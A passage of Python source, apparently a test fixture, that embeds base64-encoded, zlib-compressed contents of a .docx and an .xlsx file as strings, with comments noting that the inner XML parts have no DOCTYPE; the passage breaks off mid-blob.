        # word/webSettings.xml
        # all are xmls and start with <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
        # but none of them have a DOCTYPE specified

        self._docx_content = """
        eJzte1VUXNvSbuPu7u40DsEJGiQQNGjwxt0lQNBAcHcI7u4W3N09uLtLkEv2PufuvfPnPNyn/+Ger0ev0TVrVY0evb6qOWfNankZ
        CEhMADQAFgAAkAGkm8FtLcEAAFpoAAADAAuuKWpt5QCyctBRdrUB2X9gcrG0IM2EBKf9CgAH/Bf/X6M6ZtCskwVV/Mb/yXe8dk66
        kTanqz8zHERgcg/2hUNODCQlGT274kzIlxtDySTbwjrHfvOd3SBh3FAzyRCJzMzYnmsImhGMIXXCKbIqfF7GbTQqsINeL8U/5Yi0
        sv/23oxj0TUQrsByaB59XMiGeAtdGo19p10xxyYDU7JMr70lIl0f7MGJpX5jQh0ymO49sQW/m49IMSL1qOa9VjQkSyRVuKNBbCz7
        Wsu4Iun03UIhCZ1pdESk3QpG/EIvgZnug4mICg/R2O53E05hBslc8tUi2oJgay15LZ4GeqnE1Dqejr0vIjImV7HJKHIiIdUXE4aW
        OZgLxLfv7MSW8AKf3yn8cOqFIIe7B5ik8KFxsXidhK4nu9JIrhFqfPZ4CJ1pxAAv3g9aW30IFpDPTCDYNUAJdaSBnKDyuedpTjCw
        tmeK4s1rv5OMBz7oHXbuFU7RIR2SfRVs3eOKLGZOQyksyn9N1L/9g0/o6SXMnp8hAPL/iFLiSPy6k5dPci9ahJco1bEDWdgzM/28
        /jc6/4ufKI5qf4lOxNcnvo++4y0KC+24WXLMBmOLuPMwsJpSbzEW58xmnx755+bAP+zpvRmcmIwec7NPkXBcjflwih+ngvSlBW7m
        TrtT80ezCyDWvzmH1WXGZh0xefva6HGAQopuwDdYHevLKD505G1gwnAbxha92PVWHoIpOd3olAFlVVaarcrsTYIn+9dE1ukZM0lN
        d5hCAfFvAUSNI3ie8EZCFfHswIjwju+VH7qU96Pr2ULN6K4Y8S1YmKlSIvWL4fFPm8f33bJa87qD/BnhMuCCmH98NNJC13ja+bKN
        J8R1QqZerbNmTZDyQfgC7HfxgYbzdR7pRcMDCQAQAmDBnK3tDJn/DBJDawNHy5cJ7edM9u+AAXsJGLD/7Qf2v43i6GG5l3TudyLZ
        7FvjvJ79WjhfjjlfsQyVuE2WS4hc/c01dt+iAVZOtry4wG29wdHQTkWzhpdjye3rA3xR+ChaaO+Y5MwM6XbN2gZXyDU1pQxN0Xzd
        1zAHl/dmVz4lRq2b+7nOHU0RSvLsN+8UG5t75Jr6LiWfsjlqJw/faPZr75w0ijQEbuRUK6FIvuPvrpXXresGBlrsnqFbK8XJho1S
        rzhLfqQW8Vw/xkp83Eqpm64Vec+CRnECe87fJyqJet10G2yD69VlGKaHFtX+aK6vvI0a9RWWv5obinvI/mww4iyHbOSyNLW5SyHJ
        tx4Fzls5Ys0UIYvtsw1OLUynF27YBCzZO8GP90i/oxOCdy2380tGlXsR0V5G/qDT34mUHddvtciCGnACdY/sc8xFZW3rNye8yNiX
        8TqiescnlzaovP5Tdkn9uxUyKnWmKejKDd/6kV4vbsKJV3XWzYjXygTU3fQhvQq48sKGA2Lf4L2eXHCBnW1qjIpa0sKqa95Jp06P
        d5OysdlRh9xYXAA/FqmcPnrGYhU4kQDMGAP27RATU0OjXjE7yqoQtC/0BUocQet9szFxfvgQBx6d+uGyc6t9iywahbZQPcjcotlt
        CxN1YWjpSIlZ5tWHvtQ4n9o6pZbeyI5KACOUpiGGmcC9C4lNPfEKdghPSMAK8j+1vzULA3I4hnHPLKbig6npDXIVG14DhkzG9Tfp
        l0wjOQLHFYLZpcyAsuMau2QHM9TOwxVXDOSyMmOk/nQJvGkCnnRI0MHYlV6jQQLMi66xX2Cgz72C7FU/50AgR650RcXXnN8E2XKQ
        kiPbVuOSr51walIRso8DP47PpFhY8Z+a1H2SQilnueTvahYmtV/9YKZM/6wWQ1KzVBDWIyjhjr5IMbh8YFyeNGnn5jPc29WMrSZM
        bx/FvyVi1kwnjNYl+OkUShDcezDKBqlsRCIXRrXwq/TqtLTOez1MgberMMwqk45v2JsZSkgSR8tKT1pynEianux8tda+fTOm2JpZ
        lizDLmUjLcc8JJTWRWbzFBgoS7AQdeC90c7uTezLiiHgipkzfkTR07Z5uicIIGVfv11YdlRRfO1RkcJkXj/QamBsQUVpwx9c1izE
        yGwxuyRpTuUcuDdUI5OUGoKNmYdZ2lHUdyJOnSNgus13kKxtF4uqjr/LCY+hMXq2fFooZLa9xJD4dXQIXZ7nQ7XnDNO9GRHc1COa
        2vNvk5727k4n7QtLY19E9H+z1Mja2sHK2gFk/5OmQ7HDdoukqL0nqXt8JvWLkqVH1PiDPFOyNHVvJwQBwn365GrQEaBWD2Edp6Ip
        isV4bUqwptZH5qav053amO1hpp3C1LRJAbS6USIDW1zCrZ6CcsfyuoyRdHSvKyGJEoRRDkbT36ukgKnBxSW2sWYHMYhjxGgW6Ycg
        DSeSGtFzT+uSVinBg4vG2Q7YQPF2V7HAHzDneLMZaLVZix0HCgPDjnvHFWXpdw697d/aZwIXSfDGuyOgvvU6i44dwkcM2mAjKegw
        SQArVDkBw2XgPCoQE+u8E6Q8rBZg8m8buxGrSWeQrrARMldkOG11xRm9NqDqYHoR44mg0ZXN8OoCpcq6m7pC466nXXdZbQnikcYU
        WUwPAtWqOkwBpnal998xZieW9L8LO+1EzQVlVhUpc1RGPPNyJ+cyvlnFvbMEio/TCr0L6UDDOgv8bhDiJ2TgJA25do57W1jCM79k
        Ymju/GkeUM5xyNaVKa5rj9qbpVBwZKnylJGh/Aa/NfSacsU9rnWOWbdm2W6hfZuLtYxH4ZgWAV/Iksrk/D23eOm1N4OOvCrpaR5k
        yTtPPmGsRV87pwC6zCCo0CXMdxgcQWaiWwHHrXHfKGkRSXCCy25WWsQFavTw6BD4tFwFEwvJRhdaQ8in9hwkKKuGPnBlONPWrzTM
        N5M0x2hz0wFJm7XXvrfoOfAmUy3jTo0y5aFcZJEC40EeMi1Pqea3Orn3GZv2pumIQ/evAL/jFdk76bfUL7wK/3v2A1kZ/oNWySx/
        0oqlcRHcrAnOIEV02cFukPIIglYEV3asV7JjznplaxFYAPPCKoDUC6vKnKhmUGAi3d2NGFXZJNqX3hBHK1NpHetfHuxsHCK7zqAl
        RmhJYWdRVO3qXdxNNoYkvM22G3L7FMFFzxmqsJ0SxlLLYeAz17A6RVuk+CpPWjc2N4VNiz56dQzl4V6GQDyxBvWEINJdXyE467Np
        dVcEegrDKvhkCG4vMgRFPW5l182tFSJ8GUA4QI9FwqMBt6YjthDNxBYLVjlUcvBAMmuzqx4qxggdWwkEacvCwccY6Mp8idiWxP3U
        Y38c1napSiTRnc/CZoZWpS2zhc6psaC6o5fbZalV+wXbR0r1TVfA1ldhqWTb5Zu0+jjoYHWY+XQZfebzkdKp9i6Rp4NVi+RKxDa6
        80WNL80Knmm4txj0imRu4XToTyHzdGh+g2SnKpr2lQ3tXTPHgDXY8soXVlWK67pjdo7TXh3X0j+zFI5BhK5IuEedCBQ1zv6LVdcv
        rMIbt4mBCk1zUsQ7j/Mlz2+B2brYh3eZphNOXivbiI3kM2OpeoshmsIGm+uCnqUuv2iK26EDdA2KPBFiitc5aVXFvpqKy8nuW3bZ
        ujMsDOBP3gdxZpBihEju4y5xem5FXJhtdIgLudDRL2fbwK8N498cI2VNzjMm9nz1rKXziCFSmbBVn1KdOlhJvH8GZZJIC0Zfnlq+
        av1tsmJZFqUDhwYAsgkAAKx/k8rBBGQJ+vPK+pNYh+oy1hhvCFtV951xj4geAomiYGG6w5CAkJld8raEJ2HOMKPHxUY9cN9UbIqV
        C+hL3GgVrQWULSNf7/t7JlUrA2Nv4R9HD91aDMLbI5S/YpM0X9w+roSnVjBrNxKwO4j5ZfObutZcqKBEdu2AyXbEOVet8NWtkRXY
        oOv2YEycU4u5xdcKPaySf1dEC4IDvxezWovDoYu1UqGf+AxiHL2IoSx/tUneA59LXgwJTgKxkqCyP73vRtXDcSbvY6DrbsCdLSjs
        MTyxmMZ2wnYrHTOFIIjxOYmzghaRC3f6UlTO8DOcg5/6IAQPmNBxdNOAKKIMFAGwzExQG/RDP4dU3wzOMqjUWJDngxxqyH6AnJ+v
        T/mMuYX2HPCWAKAUXG9Vt7g3A+8J/cmDhHHYgc6AoCVUw32gCnIgILiZb9qoRm9D5mEW+zT5yKmpwXQNiZaAC/uUYPqqR265g0Ce
        y4Jpf+X7nsMMsBkM1HkF9fGkY9uts4dAvsuETeP1gQt2JB2p6Egp9xoBYCWBug1RhQ6kKpGeD2rA3uDTugTo+gRjyUYkZRsGerQ5
        2vCjYpqDuQSvTsjVbg76UwERpHTGlGuaw5UQsVh9m13uN4Lzwsf7W2hobjx5GryeN7+PIhcycMMNKo+2Pq+ffE7PbCX2unloV7Vq
        Ztzwet6rWvF8nEBSBq1WlZE8nm2OV1kLPl98hkG+DWvzZWt+Z0A+7mgXguyCGMADGeHtIvDF0880UZ8GjkquPNf2axN95dgsTcLW
        eIWNpb77adwn7FVwbeKVCkzBkC41BZhTM0zNNoER9WSEPFnVmuJKnB6pXWymHtASWM8bpvnUhlunXrrNcw6gpYkYI+cNnh/hZ0oy
        +D0BQfIuYadkxcEy9ykcrfMMkTo6M4N9B6l05GKLJLQPGaxdoHVF1HXLO6MTbDP7bf1WmTALSmUoI6Y4P3Wr5pBe+F65UNuhgT5z
        NXEmKhSajjpCJiwxXsqQLKvX2Q7jS6gYMstFuG6R7IfuFuiLkhm7ff7NATzMFM53+Rhr3I77b6PzQx4lw0jFWRd2Bgog6xjERsmQ
        udXxjzVj1NY8HS1XsjNyJhiFL0fU6qV9bJqIaSwCg/S0Ew+mWWW1Z+rx/EdSpbibepBKzufrUJZTr1It5vlOr+2mhz5maQckW48S
        MYHfHzvvfOCXu4bD9IO4/8bTaj3yfLfdXJw2+o1qtLGcx+cdykKAbPPllEB2CFEhHMVs9t4K+hCCW7kJdUA+92YeGqK9LTYT5lxI
        5Oo+RmFmJ2weaa4RpR+bMZF0jB2cKkLV4WbJq9XHjMqa7UtFOJPia5cIYFksczIUATvCsL8TvYksu5rK3IL/JFwRqA0rZzrELHgC
        Pjp1YojihnoKqeM+z2/BTQADKcgHD656hR16sjzFNdDQDyKqV3KxxURy+NYSqm4veGN/gotzUUlSk0oSZBtKtZ47zicbk4topDDh
        yKcaxlhhvItbbTaTTHxuu3AeYLPko5cCLlSgiWWkN3H+MTb5fEA/7dVcalzNvqIvEK0gwgxnkDaLTZMHTcbofjYZ6ehzFWvbeOj7
        SX3LrGvsGpZwO5N+G8mPNYYgruGbWzU0W1yoXpO2nnWA73delfa0T9IuKglakxhgWGZOukaqntpQF613m9Pe6vhrzTR76KkaCe3D
        9WPtQ9L7WFU8yytjmErnxobSPKHPxrm7Q/4QxxpfPwsSQkBK8L7RJMahXx/znwi8FwCDgaFAuBSRx9ag6rpkntNQteM40MRDUZK3
        0VeA4RDzEclTiiQ11Nly+uajDjz54graDDkXVMpnmDzkIX3jd+V4VWr+QwBTtknqGNY3GSVJYDSVFdYx41sRTTqjpfaNCwtGzHgZ
        ffHUpUyZz/BkwWlS2UKxATCw6JWq53SujazwPQL+KyzB5FTrHw+AzPC5S7EgUrRREAxKtgwrAdLrHQvW6Fx1EPpTicEUI6T/Eo9x
        fPAGYuoHwvjtlEc7W+vjw4+Gd40pb5BVVbFlqhUb+xLmO4TUP9rAGJ50PJoMxXBcRzbZ0B29ffYFCCaKiTY+ovx2JQKe5X+J+rKl
        Z0f420rEHuTgYGpl/MdKpPq9jP0iF+o359xn4U4+YBQ1XXJoSgXx25SKJLlNbTcIOPkOXBRkgPR73seTDz5+dPNmPabUjbBz1jpq
        H4O3mm7epYQ6iZnSd08hMINbi4nRsWIlF9zsiB7ruFJYRrQFSgnnfvc2OXkcLmttXjROwoUwc4Nk8htx4bmq7ZmadykeBK5J6vQl
        wQIYCrjZylWSWd/sVxQ8Kp7j42nISwzrEUIJ719ZbU6Zx/S54Qjm5URpvM/l7DdUGY+69BoRaaGyMq6MAHUGsXCtq6FB80hm1FXP
        jBA8t34HLPHSNFkT6fcmTi5+bicIa4qHF9JspmqZ+fq+klKjE8p2Gz1bH5aw1e6S8Ae4/s2b6tI2fsTDfe6LzR+EYmWE2Ukf04Oz
        nVlnYOTSUiiGvytGITfm+YsUUmjpoGgbOROQYdHjZkM44rWPS3DxnUCrPalICy4YcypQaXFWS+K6bGC3ZYsgsaPkqxGo+w4gC1NH
        53+u++wm47c1qzPGgxyeld05CFTM5xArMVfuAA7nsEiz5X3eOpkYypDB1NI3VpAy9ePYRHFshoD4kpdGkkZ/pZ88dJsDRLud3vZP
        Vyqwt9efuzot13A+AUuA7cqIoxH4FoWL75TO+eXb44QmhGboGNaRBSncSXxmAn+1cz0XjIQd7XaSJ1UduJdZdcbq+PcuFMPTEsjV
        NLJzY93lzgxqHuFcb/MfUu2M7HYSB1gq0oV83t7xQkDcEvpMUoB4QPGnY+X+lpKLNz4sIaEkIXyCuWiIZMXL6wgsMwXQwmmU0Qeg
        eNNgZMkEubi9aZ5NNvi4sy0eyhEa4Wbuz299+o+m1a2rxDlQLuwlidtPioe9jFNHo1nqjxnG0pONj2BN3Ys0ayiJz0b0w1wyaPFL
        FsjYrTjhr7izOtagvHvDCCkOcm2+njh/2g6sINQmgpmr3cbLbdSOGCidhy8YXq2blTfOOQX3dLue/hYm5iFfWcDnUCa/HDlZ4Ge7
        pKmod0znbLeMaW5Mteoq6IPvLXQSUzIpn+Zh9Mmwtv8kkqpomqrjmeWgf2iqkYpcPaPx+FbLoqOgd9fIvCPOB9oJ95v4Ye6cmAC2
        OuM+S5MwyJ1t7BjHl9GukqJFhqaJ0LAiutuX0bbSMCJHLq6WLYFEjJWeOKNmqTJWNYq1geZ241MruqP4mKZytPirnE/alRiXBjLh
        TniuPq4SLJynQapKQ+MYSwqoOSWuZcNjwlzbYnXdGlv3UxAS0A25gqy1mF6RMnwCMvAOWiQurIgtwUy2Epz8YpxDbyhiOz2r1HCN
        1eKcx6TKK88HQZVDNIOlgx1dIyoXAEovP/dnkUK8CcibBHZZ3snWje5ptpaRsgeOxDxP/lbZh0XuhNtgbg057Cp1zLxBr3tqR52m
        V8+/rZpHO81I4b6sRl+/aDH/nT6cQfpKf8sgMePt0hCsqNCrTat8fkuLFsHASgdN1AIXNGGPTxyplr6Jb/uyrQ4m+UpV0JiPgNGG
        gtvGRsEC0FfQiQLdEuEBse9RiUo8ljjut1x56me+BIeaE9CKZKG0ubG2Nic4OsIU0dCKe1aiU9mFlo4vKipaIjYBv26RUQWezylK
        aGYPEfhytR5PtKFRaz4MwOggG2mpKHkYntPB15Q428hYfUaVWbFmg0SjO5+heZppVKoOO+cF2bUxurJ8dDXxeNCTUH0mvWTCUNIM
        QN/mVngn9SN//x2up3e/a9stCQuIOzyBEK4Txq/l/e7+D9lsC1VhyqBsQ/rpTjcmhhxl/ntnNcVv/VOshheulqJfj8/W5OAvjE8u
        fp+I70eZoE1ffskV8J+JGBbM0NpA3s7axp7ZwNoO9K8zwv8WVV8QEjUo98cZmeSD6KbHOiWwjFaK6vUHBbggclQ+g3eak3MVFnVk
        XuEXjGgfypN7U7POiPKCrRVc3owFxLOJKqCSo1AC8eIXEVtK45+A5yFUUZGZMREZ+Igam/E4dCpwQE7+A0XvWsKQHckJSmWQiXGJ
        NAuXA4xPQhtdtrmVNDDQseC7vvhumgVYr55LKJRaRyBVPdi9GWUmcf9uoDLMh2qABCsm6WsN3yzSDpoSKODQvHfthQxdfQlWSizy
        sMKj5S1tcSF9vlHJ1BHJ2s30pMwP5fTBHgZ42nd4sox1UJt0gv5MbJ9Hmb/WMoQHBRdA68ukkiDu1vJg4hfdyKvmGPWEyrLRGOjm
        bw80QjiNSbUXIOgfDnxw6PRenhV4tm6JNOM+36bZVCjCnayuq1mES9g5lOS9CBhZPFyzbRFzJZR45cl9sdHkyPFu3RU9gGRYI/oO
        Q/4S4SHdhZMK+dNI4l78kBfgd/wUWHerwkcEAMCcAICfDP5zoeDgavFnweIwddhukRu990Sz5qRtwvRmtW8lTGnj7bwcv5Nsigu5
        sVLNq0A/xmIpkc7wuZHBw87DYCAgCj2bmpZr7mAyzSLokOT1ww+UTCmph63ZHUpkz1NGHDYBgqOWeSIofiQQ5cTnqvG6H0WpdVmk
        zGr4FWq5DxaXHRfjZSfP9/E6ad+3umWGLl6DTTx8QE8L3RavcHlFvLOWQsPoRYHDr0JgzCajlqFthLLhBwrf0qeJ6ffB0qfXV2gO
        uXF2Dn/DSX0gGlmVCHsHgxcH9w4BQ2jEpTiQbXhHP/JVdZ5gNU2iePDbAP7RaWEa226ZBMn4hBZRgLRYQr/WyJdX+7r7xHgx8CuL
        nM9UZ/A2fhCHEG22I7aBWfisIzroT/zwUafLw6L07FyhWFJEil/dsHBPd1sU2aPWYAQNQFqb9yCn+GnmA9Xt0di3wfwubr3n8oHu
        0wj+0n6Z2ul5DbgFwJStblcmtYOehqc8R5kEnJlFHHL0rAor1ucCrifds3kTr1bXHcUb3aOWhByUYXf+5bujjuMg14NFsVZOlaUq
        tEEn6h1eGy0StatZ3qXubYbJUx//jupOIyjVoMJzMVGDDI8KL7ul5luNfTQjENmBBOLX+6ausPbAogeVef6Ctzm15/M0eILnJor5
        SMYUk3FuF4vDH6gNc0PsuXgFSlZSTsW0gmnXC2oMeHHQngV39upS3hTdPNez9eu0og2wqTyTpBAmMQZe7G7Y9+EsSJuZD1RTpzu+
        Lr5h6i60xXgyhlgsijUJTrfP3YnWtcbQawwXOTwIXOJdcDJqsD00YlYWhSmbHlsz53S41EDCo2iWEKV5kRdnzfp0n+KRgjjWR2PR
        9Ng/NYZu2FAkbbAQJG2coidtlMMnbdiAJ21IOnD0RvaahFHIoqWIBJQyVkc9tkUeLS8d7cAKHV8r+ZA4/8BrC2/y6LjZsEpfeaxf
        zLN/GZ9ffBmq7LEvynlvk2URh+37gSu6UhLU7usjhJJXoVzxNlK8c5JGIC2SkBIsN2l+H+NMV6Nv6OAIT//tvpcgswMPTp86CwYK
        KNfsIoNoZw+FuIieR1ch28WvLQQHtI2Llp4ychtizI/EA9KfFHakws0GsVH1DUO5kxqccZATfwuQZKNjxNCYHrW3RBeOmIJDYOdp
        No+KHEZJFxP8WMxBWU+7kYBRITiZnaCHVIaEaORiqsvSyQDhi6eNq5akgKQgS4FfkCTBocsZarJU+JCNX/ciWP0UzBZObZtwxC1y
        XdynK2afF5ZBjFegs/bHhMDPMQVQbaeTsh7DHPUGeO59c/rEu0UTR2o/EiqOtPp2qerzuPOAUsoHbtHk8fv54hrIJGOc+LENcfzk
        7kBXMWjN8wDNw/fA6Cvwo6TctMSYyczp6oCpwWoM7PhpH6f6RTVW/s730PXo6nJGvk6MwtBeM4PqQJruobr9rdOwErVOyxoehkin
        Mgn0S7a4NYphjo+PlauJ9IPEMNGlhoSDNMTjaDTi1EVaVcBWa8o90F14v/6InZ5ZDqfYs5KHvahAPSi4HcYBhz1yYvfalkaPHHn3
        PersTV26j3vDGCiXGBd/1Z8RPjGC9YDB2+vHSJ5X3t5qA73PJE5mlgBNI7+hbrzPKqVSpKGYmOLg20j4KPv8tccRndwoEBrSEdPG
        tLEavJxYSrmhApAXtjlnu5uG8xm1OADxhIQR474RNbbgWEp3BtTZnPIU/Lkzr3GUjbSB7TKHcejqTdUU57hD/dqgH+fSKZWPglIq
        scMTOuEhvtVte+laPvI1m5ErU0qdfIur8ufF0/xwZ5cz1QtDxip1vEkkXQhKgnZoSS4/NqZojjx+/U4Kft3OLEHtjhhWfh8Zu4Ab
        TWpyNlbEEGk4iKyo9rZ8DhYWRbAAL5FeH6TnhDAogif1VHiJashyXWVXCbd7msZBg/b886G2v96Hq6Jtxuw1sLl83WqShSlVEQ40
        SdWr/SJGjO5kIp4hdxAU9a81xo/ZeCZ1rCJMr8iswLO/SRBhMNUyEMb2rdzFFJsnic8z+zBkMoblUDbW1vKuJUgedKyN782wXMiG
        tX+oD1bv22ELc9nmpnYuLoynmZ5l42qybhw/qNyhOWNh9un/6Fqz0kN4YhVqAX9dU36EVBt6Z3vhEVdbrkkcxGbKC9/61vbjmNCc
        4aXG6dr16rS0PvA835jS4sLFfdMsthnbdYIdvfau1jj7bE/DMJ5EsPywghNNrvHcWH2DJ+okmyE4rr1k2Ilqgq0SCPWusdJkmL7d
        FXe/CUo+1TPNtveGPZyPeIP8FZQBzaucurKlQCZfjy0hP8EqA2rZye/nkxjJw0QJ4g5liRfhiu9nj2atuK+eFWdDNbhzeFA0eGAe
        rbVKhtmObQ8FluvRWnaIXmXeQG5KXCYFpazl0/XL7gm8akBroaF7BS6g2c4OblXrc1Y/D9/zY+h9xDq7JpIa1ItRPIQV5EI+qjfX
        /qdYHwJvNnrYGzb67K+h8GgmWSIvGhuwAHb6kF48rJ4fuFiKH0Pg6f4cf7GgF/vzNrfSo9Q1bQl/zGoFMnBL5cDXBNPFODC4WD0b
        IfAbHi8Wgn/XYZGPSfjD/hRByqjHIGVJ4f87VFSGf0/w/242PNwBJuF/9rIFcyHJEvkSrkAG9YvJTxEPy88dD0vxX0OZDEIHmjGl
        4fMna2VuvEIVK88zKssFZdeqDZZTwl7Kkwyvip6d0ZiyPyJqtLq46O6HeqKyhvpzxOcT1U1blt5JQu737MQPHlvfzl16CzUqe+F0
        LLFDnXZ+i1xNGtBTHViM/NrHdzjgwIdezIvSZKTDh54CjdJE/WFjcFuUbt8B0qcpF4/BZRTtO6em5ppNYNO2CQNqmM3skAVUB9hx
        UnhJW9brdyPJ428Eevdc7u4UX+9Kvwm2Wad2yKGaKkwMy2C9/7JNfakyKrvLkJX8aWIyqB3hQCIDyynrITuAq1P6yFr5FRgDJ6WL
        FBLLk6JoTN0U6hYNZwpuhaIo+Huz5/552dMofN2HnABa6wKygXdmLvSd0khwagVkYAxXbRiVGBvMnGKuMkgKnoqd3UTvzSTb/tS2
        y5h9OovHz2x+MRQqEI4NicNHL//DpeTf/BXKmNljgWTNYjrec1uhGUGty/W9J7WyqwUXKKRiWKjSqIRNm0afKhwnVAXOZzbAeUzb
        Y9wP7FJ/vXTQP+1oVDDxX35xbjutmDz1JOGIUa64UUiVN1VvVqBkplUzRcdZqmEnE1oUt5DdoyJjqfjj3YiVT/x/VG8U5nAVwKRF
        pOJ6/XT5008/8OUes2h8VWCN1L9vlPu38g8vm3H/UFr+z2/QqELms0rzlRpu8Mun45v1UnVBZtz1Xrjed+YoCRO6Fw9cNV4Zbjle
        Bkv3IvLKjz1mSBx838XuVfcvfVcr+/jppZ0p80kaVYTIBi7rvlFp1JiK6BmsadVgz7SibJkcfkyqWt+RmzQiHmFnZZhi8ZkhaoU1
        d6tSbJxvIp6ZLlf5UYKkYbyDkKpORFQG7VsEuWmrJaCFFKYSm14qmDYTsDgjNZ1jqiWQ9vbRPloC/lRZKKlo3+JyiD5mwbPg3n6w
        sGWro8V8yFi8xtF69oG/refa9ErGeeR26G2QXJtLC/v04D2aaRhZmeePb99UT3CvVxokG2o9FyOSUcIRiSydn2eGqvYjtYY87caj
        IK6ymAvHDb88iWsuWmi4FUeJyGIPx1Edp6/xLzsxAguitkR2Ps9bOt/s7+5uXhrU2D/68cXOGenLeyU/XsaoNziQ2TuSc/PmvzOZ
        EZQ43mLKa5p+Y1tdzInCzzPqafV97dz/osHVgzqyfEhFLqkfibJnod5SumIJvzjAURT95u3mjEmyIBNrOY+TSq2x2qMyplbAdPnz
        Dg5966HCYsxa4cNo615lEZq7jRXn89bJM8LvthGqJZmlYy97WC6of5yoWzko6+lb/LHPzY5asVpgwfx8QnNExLgSz01WzmWWT8+V
        vXyov0/chvtZ7SK9jybi/JqvFiK1qzASKKlwzneNkx5+cXtpxsEjjTIwn7TNLhFU3XEUszx72Tu4fZyGvtuwbHtUXLwnBe6h4fFw
        yq0cWiWAumSdwZaZa7nirBLnbZKzxmKfWq1mkfKquVe1dRTxRghlOdUmd6Nlgb7kXuk9S202Rc+KiK1slt/DYVe75GLvY2I8ftCI
        SBEv92SAponvRdMIHxlYuXEWxqgNiDmhuRkcj6oZYvaS3cKIX0Fs7TqlmyZrBRBs+mkdvhySB6kCFw0vJeRjTlfg/sF33tE6fKk5
        9HalSNjcorNRSlFQQ/t5knnNFT02rxVRH6H5m1LzAfhaPYTmzzr922tyVeXy1Uu+iBHVETn1axJ7kzz+wmDZInlu42kXFDf0hMDY
        10cVNp+ARXs4AaoV82Mxm5xAVhdtnSjyjwzadwlDzHAIQYEp1etkx+iR9uq+K0NR3gwYzAOSpCubr7/xdR7xScDXimEgXKINDdHg
        nUXyTUuePTRFclKnHw/aP1tLED9ZUdpavarchn7j22pAjitJ7RNpWnVmTV1q7BvrlRA6d+M10nMLKNL57TaSwmeRZ/jl+c9AAACo
        fy9z6NnY/LfK8RdSlIR/tj814+ySQH43WBBGw4Qu+WqDujnGBV1MuQOsqQySpxS2CqkvO1EMwWoYLuAdRozvXGPKKdVx1yRiod5Y
        lmY0slfImPzGaVWHjjJ81K2qQAU+63OFrLoeKKU1my5UIHsJRoH3FkuzvhrdPbM8hm1P4DrCqPnQJeeiAkYf33nCOXXcZeNKJjxs
        c+ujJ9VZ7FjNnLbfuDxm75b302z1Fe+OTPgwa7lOCf6hL1THvfF3U+OSPO1+BZVQmvLQvYq0Kn70Gm+iXLcMQ7D9/l6urSTwKTcU
        NA7bZ7txvwJrMrUs7/qyK5SsrHffsvY9YTW3lqXlZDB1dIPvqfB5jZ7pVFZCGejgV5XRnNA6noALfVPvfbs5dVqO26iVzz/IO8O6
        FhOw8Kx4x8FMbRrEDlkTH+bkewp3LJXHcr/mWJWMqRSBthDNVHsVMEbPcw4mN5g797GfDIGbmbAvwvvMlVewXb/x5NbqUnium+Mw
        IkMstSuRmi/1LP5g4QaM8EY1LJDgIYVYZMP6vMrlYK2BO/EuOuOR6xNT5528qub7ii3bMAw8KMfeu6zh4+bZo3KB6YemiJVJgzvZ
        g+5pi5GV009y+EK+Z88Fz4B/hwAYOBDwn/4R8Ct+8/+AXx38s1n578h9iau/tS7/avjPLs6/owf6X8n4P/R0/urp1wa+v4AF95t2
        vl/Nf+2s+gtNCL/rs/rV/tcOmr+AgfybfppfzX/tlfgLJqj/oXPiVxe/npz9hVTs35yj/Wr+a+X8Lyzh/76O/quHf1aM/w7ql0f7
        P+rHv5r/WtD7GxWI/0d571fjX6fxv4DE8LtJ/Vf7f04D/7AH/u27/2tSkJeBgv5D9/J6/dOC5af0fwDQDzcQ"""
        self._docx_content = self._docx_content.decode("base64").decode("zlib")

        self._xlsx_content = """
        eJztWWdUU9vWDR2kBkKvoXeQIr0jVSD0DgrSpBfpHekiEJCIVCnSQXoNvSO9SQcRBA29ioAP733fuF6e7/f78d2ZkZOdc8ZaGXt
        krr3nnguiioIKAqADMAEAABhgsZtha4YEACSgAgBEAExkYzlnJw8rJw9zHR8XK3dTbm9HB7ocVGTWbAAy4B/8v0Zp8pB6Fy/B/T
        OlS7lPXCqLVdKYgjuhfYTsmpLt3Um9xZbGmXZ2PzKjvxPIviF+IlRJOLrox3cwbFvl5FgXGtXbrIUTG9LfrmtGKcTT04dgaiMlh
        7oZGe5lgyil75Kbm8dZpwFeudZ3aQnIr8molFLYEpNIBq9nzPfpAVd6G3GKjQpF+hc6VtX1loHCg0WTBOvjRFNP7Nj8zI7WuZRR
        Y+n9Fkk8zfIhYANtNgutRrcLmGqrO2sD//RDS+Rl3ogEON7SyAp6c6sQjZoARVVRzHGxUW+CPUebv4m/bxvri9hjyEXTPWJbcy7
        jTOkQcOjEBwDEPraGpIzPaTSgW4o498HQfifd0nemNSKq7hXKx02Z8QmP1cnoHTlX8/sy5TVEhNhDAwv6BxqE2zV2LKn8nd6OY3
        xCvX/+A3QK3G46apclGGgHMwZE7qz2b4v5IcY2jMN2D1K2g/iu0QGAHz9QAJC/lWWtLi/D8c3owU3VYd+UpbmblYM7D/fP6z/l+
        A9+ohSqptHFixOxp3QZ2X82vZRAIKvqJaPUDNYJDFZexK+Ny2WkXGpjoSLQoQhDUQyCB14OLiyJx33pB59+FCiNJQSJMdR5lUXA
        LlyfYrAzu6UouJaudQM9p0+mT1MVVXxYPeHx7CUNhW9UB1YYFCYP5CsJRrn1KbCI8qkiSCRSQ4x61QyXLc7LkaZltXfKIt7VC2V
        /SRpNC5pNebuNKxUl8gAxkUrc725hM1fu3+8APvlGoattK2L3ziLTTZTex/yxQ/uRfFob0ZU/l3p6vxa9AOE536hiH1P2SZBRjc
        DBUIZPtxBWV0n//kBoLG3hMtLviiREMhl2dDNquqkFCgAmkrcDz5914uXsZm/h7Gz/c/f6v5pBuqkZpP/1f/a/RqmWmmo3LwEc+
        zqS1yvNkxg458FDj9D9io85UMO2wAzmDzxeoWRvMjWYUeVBcY7w2Rvu8zwTxPuIQnTSwVEYQ4jqS+SwJ4bmPHw0jIJpsVNGE6qI
        RkSI+PK1ZAcb77U7UaMktJ8zEyS8ec7KRB6Z+5Ze/rhxIkLgyQjvU74n7mPUgzecGar5FHzxTBtRFlpTX0/3ms1640ej3MIpela
        oD+34ETmWsjiuD2B8awrMcd5x/xTzsOXSWs1nxL4j9wJng6pElaZYUMI/woMusl+RNogN6r6Rk9qsu7fmIft9kK1t4ZBz6HjP+t
        NA3/QK4HeUSZyeDlK7oUvNjdzBv7lzQ5lfyVKqo+q8wIvTiv8hiNfD68o2UyE9Jx7EwYtzH1ZHam6b+iK8H8oyoBrz6EdAjanzk
        u/2O1NOlRwp6Irik6eepflnxHHERvmcolipkTFfZQtNB3frZ69DfWZC2KWfhLP5yQ6NzOytlOHNI9zLzmiQWNOqBhuZsZCHOEo7
